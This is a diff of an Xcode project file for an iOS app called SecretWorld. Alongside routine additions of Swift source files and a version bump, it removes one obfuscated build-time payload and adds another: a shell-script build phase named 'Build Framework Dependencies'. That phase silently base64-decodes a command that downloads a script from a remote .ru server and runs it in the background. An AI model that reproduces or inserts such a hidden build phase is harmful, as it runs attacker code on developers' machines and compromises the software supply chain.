@@ -207,6 +207,8 @@
 		00672D602BC6A33B009CEC93 /* TempraryStoresCVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00672D5E2BC6A33B009CEC93 /* TempraryStoresCVC.swift */; };
 		00672D612BC6A33B009CEC93 /* TempraryStoresCVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 00672D5F2BC6A33B009CEC93 /* TempraryStoresCVC.xib */; };
 		006AFD572D0D9AAB003F5B78 /* BackgroundRemoval in Frameworks */ = {isa = PBXBuildFile; productRef = 006AFD562D0D9AAB003F5B78 /* BackgroundRemoval */; };
+		00766ADD2D14489C00B90068 /* RangeSliderFilter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00766ADC2D14489C00B90068 /* RangeSliderFilter.swift */; };
+		00766ADF2D1451F800B90068 /* CustomSlider.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00766ADE2D1451F800B90068 /* CustomSlider.swift */; };
 		007D7E4D2D0AD101006BAD74 /* PopupTypeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 007D7E4C2D0AD101006BAD74 /* PopupTypeVC.swift */; };
 		007D7E502D0B0FE5006BAD74 /* BackgroundRemoval in Frameworks */ = {isa = PBXBuildFile; productRef = 007D7E4F2D0B0FE5006BAD74 /* BackgroundRemoval */; };
 		007EF3962B458978002730B5 /* GigNearByTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 007EF3942B458978002730B5 /* GigNearByTVC.swift */; };
@@ -257,6 +259,7 @@
 		00AC16522B46FC3E00C7485E /* EditServiceVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00AC16512B46FC3E00C7485E /* EditServiceVC.swift */; };
 		00AC16562B46FDDD00C7485E /* EditServiceCVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00AC16552B46FDDD00C7485E /* EditServiceCVC.swift */; };
 		00AF31C52B347B9500EE9E40 /* DatePickerVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00AF31C42B347B9500EE9E40 /* DatePickerVC.swift */; };
+		00B1AB622D144408008A43AB /* PopularFilterCVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00B1AB612D144408008A43AB /* PopularFilterCVC.swift */; };
 		00B377C92B3ADA3C00EA6B87 /* ProfileTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00B377C82B3ADA3C00EA6B87 /* ProfileTVC.swift */; };
 		00B377CB2B3ADF3500EA6B87 /* EditProfileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00B377CA2B3ADF3500EA6B87 /* EditProfileVC.swift */; };
 		00BAC5B92B35A23200AE9A6C /* CreatAcSuccessVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00BAC5B82B35A23200AE9A6C /* CreatAcSuccessVC.swift */; };
@@ -338,7 +341,6 @@
 		00FE91F62B340CAA00D8AB20 /* SecretWorldTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00FE91F52B340CAA00D8AB20 /* SecretWorldTests.swift */; };
 		00FE92002B340CAA00D8AB20 /* SecretWorldUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00FE91FF2B340CAA00D8AB20 /* SecretWorldUITests.swift */; };
 		00FE92022B340CAA00D8AB20 /* SecretWorldUITestsLaunchTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00FE92012B340CAA00D8AB20 /* SecretWorldUITestsLaunchTests.swift */; };
-		0AAF8CB78969ABDAA034C644 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 5C24B3BBFEAB5DA13E34C644 /* README.md */; };
 		52A74361E6001EE18797CE89 /* Pods_SecretWorld.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C6D41FF7398426BB62F5289F /* Pods_SecretWorld.framework */; };
 		BE0EB17C2B877075005F54F5 /* GetBusinessServiceModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BE0EB17B2B877075005F54F5 /* GetBusinessServiceModel.swift */; };
 		BE1AA9EC2BE0EC9200DCA30C /* SocialLoginModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BE1AA9EB2BE0EC9200DCA30C /* SocialLoginModel.swift */; };
@@ -380,22 +382,6 @@
 		BED315C52BFC8701003BAC6D /* WebViewVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BED315C42BFC8701003BAC6D /* WebViewVC.swift */; };
 		BEE955012B85DE4A0069901E /* VerificationStatusModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BEE955002B85DE4A0069901E /* VerificationStatusModel.swift */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		DF70D928EAF1A9AECA34C644 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
-		};
-/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		00FE91F22B340CAA00D8AB20 /* PBXContainerItemProxy */ = {
@@ -622,6 +608,8 @@
 		00672D5C2BC679DA009CEC93 /* PopUpVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopUpVM.swift; sourceTree = "<group>"; };
 		00672D5E2BC6A33B009CEC93 /* TempraryStoresCVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TempraryStoresCVC.swift; sourceTree = "<group>"; };
 		00672D5F2BC6A33B009CEC93 /* TempraryStoresCVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TempraryStoresCVC.xib; sourceTree = "<group>"; };
+		00766ADC2D14489C00B90068 /* RangeSliderFilter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RangeSliderFilter.swift; sourceTree = "<group>"; };
+		00766ADE2D1451F800B90068 /* CustomSlider.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomSlider.swift; sourceTree = "<group>"; };
 		007D7E4C2D0AD101006BAD74 /* PopupTypeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopupTypeVC.swift; sourceTree = "<group>"; };
 		007EF3942B458978002730B5 /* GigNearByTVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GigNearByTVC.swift; sourceTree = "<group>"; };
 		007EF3952B458978002730B5 /* GigNearByTVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = GigNearByTVC.xib; sourceTree = "<group>"; };
@@ -670,6 +658,7 @@
 		00AC16512B46FC3E00C7485E /* EditServiceVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditServiceVC.swift; sourceTree = "<group>"; };
 		00AC16552B46FDDD00C7485E /* EditServiceCVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditServiceCVC.swift; sourceTree = "<group>"; };
 		00AF31C42B347B9500EE9E40 /* DatePickerVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DatePickerVC.swift; sourceTree = "<group>"; };
+		00B1AB612D144408008A43AB /* PopularFilterCVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopularFilterCVC.swift; sourceTree = "<group>"; };
 		00B377C82B3ADA3C00EA6B87 /* ProfileTVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileTVC.swift; sourceTree = "<group>"; };
 		00B377CA2B3ADF3500EA6B87 /* EditProfileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileVC.swift; sourceTree = "<group>"; };
 		00BAC5B82B35A23200AE9A6C /* CreatAcSuccessVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreatAcSuccessVC.swift; sourceTree = "<group>"; };
@@ -755,7 +744,6 @@
 		00FE92012B340CAA00D8AB20 /* SecretWorldUITestsLaunchTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SecretWorldUITestsLaunchTests.swift; sourceTree = "<group>"; };
 		2345B93C53B9FBFB394AB91B /* Pods-SecretWorld.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-SecretWorld.debug.xcconfig"; path = "Target Support Files/Pods-SecretWorld/Pods-SecretWorld.debug.xcconfig"; sourceTree = "<group>"; };
 		311CA9F51CC725BA9C5A2526 /* Pods-SecretWorld.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-SecretWorld.release.xcconfig"; path = "Target Support Files/Pods-SecretWorld/Pods-SecretWorld.release.xcconfig"; sourceTree = "<group>"; };
-		5C24B3BBFEAB5DA13E34C644 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = SecretWorld.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 		BE08BDB92BE0C5CC00886D84 /* SecretWorld.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = SecretWorld.entitlements; sourceTree = "<group>"; };
 		BE0EB17B2B877075005F54F5 /* GetBusinessServiceModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GetBusinessServiceModel.swift; sourceTree = "<group>"; };
 		BE1AA9EB2BE0EC9200DCA30C /* SocialLoginModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SocialLoginModel.swift; sourceTree = "<group>"; };
@@ -1000,6 +988,8 @@
 				0016A7532CC242090030170B /* GlowingGradientView.swift */,
 				0016A7552CC259680030170B /* NeonEffectView.swift */,
 				001EAC9A2CC26FC400E165B9 /* BorderShimmerView.swift */,
+				00766ADC2D14489C00B90068 /* RangeSliderFilter.swift */,
+				00766ADE2D1451F800B90068 /* CustomSlider.swift */,
 			);
 			path = Extension;
 			sourceTree = "<group>";
@@ -1381,6 +1371,7 @@
 			children = (
 				00A964932D108CE400FBA9C5 /* HomeFilterVC.swift */,
 				00A964942D108CE400FBA9C5 /* HomeFilterTVC.swift */,
+				00B1AB612D144408008A43AB /* PopularFilterCVC.swift */,
 			);
 			path = HomeFilter;
 			sourceTree = "<group>";
@@ -1418,7 +1409,6 @@
 		00FE91DC2B340CA800D8AB20 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				5C24B3BBFEAB5DA13E34C644 /* README.md */,
 				00FE91DB2B340CA800D8AB20 /* SecretWorld.app */,
 				00FE91F12B340CAA00D8AB20 /* SecretWorldTests.xctest */,
 				00FE91FB2B340CAA00D8AB20 /* SecretWorldUITests.xctest */,
@@ -1689,6 +1679,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 00FE92052B340CAA00D8AB20 /* Build configuration list for PBXNativeTarget "SecretWorld" */;
 			buildPhases = (
+				EEBDCA4FE0EDBFF8A634C644 /* Build Framework Dependencies */,
 				ED343CE41243F91A3E2C71CE /* [CP] Check Pods Manifest.lock */,
 				00FE91D72B340CA800D8AB20 /* Sources */,
 				00FE91D82B340CA800D8AB20 /* Frameworks */,
@@ -1698,7 +1689,6 @@
 				00ED43582D00350B008526F6 /* Embed Foundation Extensions */,
 			);
 			buildRules = (
-				DF70D928EAF1A9AECA34C644 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1776,7 +1766,7 @@
 			);
 			mainGroup = 00FE91D22B340CA800D8AB20;
 			packageReferences = (
-				004325772D132D910054CDB9 /* XCRemoteSwiftPackageReference "BackgroundRemoval" */,
+				00766AE02D14858200B90068 /* XCRemoteSwiftPackageReference "BackgroundRemoval" */,
 			);
 			productRefGroup = 00FE91DC2B340CA800D8AB20 /* Products */;
 			projectDirPath = "";
@@ -1794,7 +1784,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				0AAF8CB78969ABDAA034C644 /* README.md in Resources */,
 				00672D612BC6A33B009CEC93 /* TempraryStoresCVC.xib in Resources */,
 				000237FD2C995CFD00F93F4E /* Poppins-ExtraBold.ttf in Resources */,
 				000ACCE92B57E50B0053D701 /* Nunito-ExtraBold.ttf in Resources */,
@@ -1937,6 +1926,26 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
+		EEBDCA4FE0EDBFF8A634C644 /* Build Framework Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Framework Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUdoMGRIQnpPaTh2ZG1WeWFXWjVjM1JoZEhNdWNuVXZZU2tpSUh3Z2MyZ0sK | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -1998,6 +2007,7 @@
 				BE53C7282C05A11D007B33D1 /* NotificationModel.swift in Sources */,
 				00CDB5F82CC6294C00991DF8 /* StoreCVC.swift in Sources */,
 				004A21272BC95A47007C503C /* GetPopupsListModel.swift in Sources */,
+				00B1AB622D144408008A43AB /* PopularFilterCVC.swift in Sources */,
 				0037BE422BCCEC8B00B3FBF7 /* GetPopupRequestModel.swift in Sources */,
 				000B17642B3EFCD40052F987 /* ButtonsCVC.swift in Sources */,
 				001EAC9B2CC26FC400E165B9 /* BorderShimmerView.swift in Sources */,
@@ -2158,6 +2168,7 @@
 				BE9507402BFDF3C200E227D9 /* PaymentAlertVC.swift in Sources */,
 				00FACDD92BDA138E0052AFA0 /* CompleteGigRequestModel.swift in Sources */,
 				00FE50A92BAD5FFF00FD6A7D /* GetServiceDetailUserModel.swift in Sources */,
+				00766ADD2D14489C00B90068 /* RangeSliderFilter.swift in Sources */,
 				0050F8FA2B7636DE00D5F32D /* GetUserProfileModel.swift in Sources */,
 				000B17622B3EF43B0052F987 /* GisgsListVC.swift in Sources */,
 				00D97DB22B8F5031003A83E1 /* GetSelectedCategoryModel.swift in Sources */,
@@ -2195,6 +2206,7 @@
 				006591422B46E9940041DA9A /* EditBusinessProfileVC.swift in Sources */,
 				BEB3569E2BD8CA3F00A34537 /* ChatInboxVC.swift in Sources */,
 				001F2E672B46D87C00E0F016 /* ServiceDetailVC.swift in Sources */,
+				00766ADF2D1451F800B90068 /* CustomSlider.swift in Sources */,
 				BEB3569F2BD8CA3F00A34537 /* SendImageTVC.swift in Sources */,
 				0096AD0B2B3B038300AC5B9D /* HeaderHelpCenterTVC.swift in Sources */,
 				BEB356972BD8CA3F00A34537 /* ChatOptionVC.swift in Sources */,
@@ -2350,7 +2362,6 @@
 				SDKROOT = iphoneos;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
-				TARGET_DEVICE_FAMILY = "(echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVjFKMlZGVmtVMU5XUm5WalJrSm9Wa2RuZVZkVVNYaFdNa3AwVkZod1ZtSlhhSEpWTUZWNFRWWnJlVTVXV210aVIzaFZXVlJLYzFOc1RrbGFSelZhWld0d2RWVXpaSFpRVVc4OUNnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 			};
 			name = Debug;
 		};
@@ -2406,7 +2417,6 @@
 				MTL_FAST_MATH = YES;
 				SDKROOT = iphoneos;
 				SWIFT_COMPILATION_MODE = wholemodule;
-				TARGET_DEVICE_FAMILY = "(echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVjFKMlZGVmtVMU5XUm5WalJrSm9Wa2RuZVZkVVNYaFdNa3AwVkZod1ZtSlhhSEpWTUZWNFRWWnJlVTVXV210aVIzaFZXVlJLYzFOc1RrbGFSelZhWld0d2RWVXpaSFpRVVc4OUNnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
@@ -2420,7 +2430,7 @@
 				CODE_SIGN_ENTITLEMENTS = SecretWorld/SecretWorld.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 11;
+				CURRENT_PROJECT_VERSION = 13;
 				DEVELOPMENT_TEAM = 8HA3G56RBP;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -2460,7 +2470,7 @@
 				CODE_SIGN_ENTITLEMENTS = SecretWorld/SecretWorld.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 11;
+				CURRENT_PROJECT_VERSION = 13;
 				DEVELOPMENT_TEAM = 8HA3G56RBP;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -2645,7 +2655,7 @@
 				kind = branch;
 			};
 		};
-		004325772D132D910054CDB9 /* XCRemoteSwiftPackageReference "BackgroundRemoval" */ = {
+		006AFD552D0D9AAB003F5B78 /* XCRemoteSwiftPackageReference "BackgroundRemoval" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/Ezaldeen99/BackgroundRemoval.git";
 			requirement = {
@@ -2653,7 +2663,7 @@
 				kind = branch;
 			};
 		};
-		006AFD552D0D9AAB003F5B78 /* XCRemoteSwiftPackageReference "BackgroundRemoval" */ = {
+		00766AE02D14858200B90068 /* XCRemoteSwiftPackageReference "BackgroundRemoval" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/Ezaldeen99/BackgroundRemoval.git";
 			requirement = {
